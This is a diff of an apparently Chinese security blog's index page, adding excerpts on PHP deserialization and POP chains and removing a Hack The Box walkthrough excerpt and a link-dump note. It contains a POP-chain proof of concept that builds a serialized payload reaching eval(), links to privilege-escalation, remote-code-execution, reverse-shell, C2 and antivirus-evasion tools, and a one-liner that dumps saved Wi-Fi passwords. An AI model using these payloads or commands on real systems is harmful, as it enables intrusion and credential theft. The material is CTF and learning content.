@@ -199,6 +199,42 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>php_反序列化_2
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。
+easy &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } unserialize($_GET[&#39;err&#39;]); ?&gt; 反向构造pop链，errorr2::func()-&gt;errorr0::__destruct()-&gt;errorr0::__construct
+poc &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } $a = new errorr0; $a-&gt;var=new errorr2; $a-&gt;var-&gt;data=&#39;phpinfo();&#39;; echo serialize($a);	//O:7:&#34;errorr0&#34;:1:{s:3:&#34;var&#34;;O:7:&#34;errorr2&#34;:1:{s:4:&#34;data&#34;;s:10:&#34;phpinfo();&#34;;}} //`errorr2::func()`-&gt;`errorr0::__destruct()`-&gt;`errorr0::__construct` ?...</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-07-21 13:48:27 +0800 CST'>July 21, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;dayu</footer>
+  <a class="entry-link" aria-label="post link to php_反序列化_2" href="https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_2/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>php_反序列化_1
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>简介 不会php。
+https://www.php.net/manual/zh/language.oop5.serialization.php
+&lt;?php class A { public $one = 1; public $two = &#39;2&#39;; public function show_one() { echo $this-&gt;one; } } $a = new A; $s = serialize($a); echo $s;	O:1:&#34;A&#34;:2:{s:3:&#34;one&#34;;i:1;s:3:&#34;two&#34;;s:1:&#34;2&#34;;} ?&gt; https://www.toolnb.com/tools/phpserialize.html
+序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
+O:1:&#34;A&#34;:2:{s:3:&#34;one&#34;;i:1;s:3:&#34;two&#34;;s:1:&#34;2&#34;;} object(__PHP_Incomplete_Class)#5 (3) { [&#34;__PHP_Incomplete_Class_Name&#34;]=&gt; string(1) &#34;A&#34; [&#34;one&#34;]=&gt; int(1) [&#34;two&#34;]=&gt; string(1) &#34;2&#34; } 序列化就是将对象转换成字符串来存储，反序列化就是将字符串还原为对象。
+php通过serialize()和unserialize()来进行序列化操作。
+其中有几个魔术方法需要关注一下。
+https://www.php.net/manual/zh/language.oop5.magic.php
+魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。
+__construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep() //在对象被序列化之前运行 __wakeup() //在对象被反序列化之后被调用 简单的序列化 [NPUCTF2020]ReadlezPHP
+&lt;?php #error_reporting(0); highlight_file(__FILE__); echo &#34;&lt;/p&gt;&#34;; class HelloPhp { public $a; public $b; public function __construct(){ $this-&gt;a = &#34;Y-m-d h:i:s&#34;; $this-&gt;b = &#34;date&#34;; echo &#39;__construct $this-&gt;a: &#39;....</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-07-20 09:48:27 +0800 CST'>July 20, 2022</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;dayu</footer>
+  <a class="entry-link" aria-label="post link to php_反序列化_1" href="https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_1/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>RSA算法
     </h2>
   </header>
@@ -264,53 +300,6 @@ Windows：卸载6月补丁，忘记kb号了，自己看看吧。关闭Defender�
   </div>
   <footer class="entry-footer"><span title='2022-06-14 14:46:56 +0800 CST'>June 14, 2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;dayu</footer>
   <a class="entry-link" aria-label="post link to HTB_Timelapse" href="https://killdayu.com/posts/htb_timelapse/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>HTB_Paper
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>第一次玩htb，感觉还不错。
-https://www.hackthebox.com/
-1.准备工作 配一下openvpn mac，windows
-可以直接用客户端打开
-linux
-sudo openvpn lab_lker.ovpn 2.user.txt 网上教程很多，就不细说了。
-┌──(kali㉿kali)-[~/kali] └─$ nmap -sV 10.10.11.143 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-13 01:23 EDT Nmap scan report for office.paper (10.10.11.143) Host is up (0.23s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) 443/tcp open ssl/http Apache httpd 2....</p>
-  </div>
-  <footer class="entry-footer"><span title='2022-06-13 12:35:46 +0800 CST'>June 13, 2022</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;dayu</footer>
-  <a class="entry-link" aria-label="post link to HTB_Paper" href="https://killdayu.com/posts/htb_paper/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>2022.6.10
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>梦 昨晚10点睡到早上十点，做了一个超长的梦，被tm一个贩毒集团的一直追杀，梦里差点被吓死。
-Github 起床惯例，刷GitHub
-提权，Linux
-https://github.com/tr3ee/CVE-2022-23222 此漏洞影响Linux Kernel 5.8 - 5.16，并在5.10.92 / 5.15.15 / 5.16.1中修复。 https://github.com/RicterZ/CVE-2021-3560-Authentication-Agent polkit 0.113引入 取证，微信解密
-https://github.com/x1hy9/WeChatUserDB https://www.52pojie.cn/thread-1084703-1-1.html https://github.com/Mr0x01/WXDBDecrypt.NET IPFS
-https://ipfs.io/ 去中心化文件系统，可匿名发布信息和文件 漏洞库
-https://github.com/Threekiii/Vulnerability-Wiki Windows c2
-https://github.com/MythicAgents/Apollo Microsoft Office Word 远程执行代码
-https://github.com/lockedbyte/CVE-2021-40444 python实现的反向shell
-https://github.com/t0thkr1s/revshellgen 感觉没啥用，推荐 https://github.com/WangYihang/Platypus 交互式shell /usr/bin/script -qc /bin/bash go web框架
-https://github.com/flamego/flamego 域名预测
-https://github.com/LandGrey/domainNamePredictor 红队知识仓库 *
-https://github.com/Threekiii/Awesome-Redteam https://github.com/pen4uin/awesome-pentest-note http://wiki.tidesec.com/ https://github.com/guchangan1/All-Defense-Tool 免杀
-https://github.com/Threekiii/Awesome-Redteam/blob/master/tips/内网渗透-免杀.md https://github.com/TideSec/BypassAntiVirus tips
-https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/攻防渗透常用命令速查.md exp
-https://github.com/Threekiii/Awesome-Exploit c2服务器流量隐匿
-https://github.com/wikiZ/RedGuard tip
-powershell history %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt wifi password for /f &#34;skip=9 tokens=1,2 delims=:&#34; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear Ctf tools...</p>
-  </div>
-  <footer class="entry-footer"><span title='2022-06-10 12:37:22 +0800 CST'>June 10, 2022</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;dayu</footer>
-  <a class="entry-link" aria-label="post link to 2022.6.10" href="https://killdayu.com/posts/2022.6.10/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
